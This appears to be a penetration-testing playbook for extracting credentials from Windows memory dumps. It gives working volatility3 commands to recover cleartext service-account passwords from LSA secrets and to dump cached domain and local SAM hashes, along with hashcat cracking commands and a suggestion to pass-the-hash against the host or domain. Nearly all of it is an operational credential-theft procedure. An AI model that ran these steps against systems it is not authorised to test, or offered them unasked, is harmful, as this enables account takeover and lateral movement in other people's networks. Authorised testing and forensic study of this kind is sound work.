# Memory Dump Credential Extraction with volatility3

## When this applies

- A memory image (`MEMORY.DMP` / `lsass.dmp` / `srv.dmp`) is found on a desktop, fileshare, or backup drive — developers sometimes leave crash dumps for "later analysis".
- Goal: extract cleartext service-account passwords AND domain-cached creds.

## Technique

volatility3 is faster and more reliable than the volatility2 lsadump+secret-decryption dance. The `_SC_<svc>` LSA secrets carry cleartext service-account passwords stored by SCM ("Log On As" tab).

## Steps

```bash
# Service-account passwords stored by SCM (set via "Log On As" tab) → cleartext _SC_<svc>
volatility3 -f MEMORY.DMP windows.lsadump.Lsadump
# → DPAPI_SYSTEM, NL$KM, _SC_MSSQL$<INSTANCE>, _SC_<servicename>, ...
# Pattern to grep: "_SC_" prefix → Service Control Manager stored cleartext password.
# This is the single fastest way to recover an MSSQL or arbitrary Windows-service account
# password — much faster than dumping SAM/SYSTEM and trying to decrypt LSA secrets manually.

# Domain-cached creds (DCC2 / mscash2) for users who logged in interactively
volatility3 -f MEMORY.DMP windows.cachedump.Cachedump
# → username:$DCC2$10240#user#<hex>
hashcat -m 2100 dcc2.hashes /usr/share/wordlists/rockyou.txt
# DCC2 cracks slowly (~20 kH/s on a single GPU) — use rockyou first; engagement-themed
# wordlists second. Targets are typically domain users who interactively logged onto the
# host. Crack hits give you a domain credential without ever touching the DC.

# Local SAM hashes (NT hashes for local accounts on the dumped host)
volatility3 -f MEMORY.DMP windows.hashdump.Hashdump
```

The `_SC_` prefix is durable — any Windows service whose "Log On As" was set interactively (or via `sc.exe config <svc> obj= <user> password= <pass>`) leaves the cleartext password in LSA secrets. Backup-software accounts, custom-app service users, MSSQL service accounts — all common.

## Verifying success

- `volatility3 ... lsadump` output contains `_SC_*` entries with cleartext passwords.
- DCC2 hashes crack against rockyou or themed wordlists.
- SAM NT hashes can be PtH-ed against the source host or domain.

## Common pitfalls

- DCC2 (mscash2) is slow to crack — prioritize rockyou + engagement-themed wordlists.
- Local SAM NT hashes are not domain credentials — they only work for local accounts on the dumped host.

## Tools

- volatility3
- hashcat (`-m 2100` for DCC2, `-m 1000` for NT)
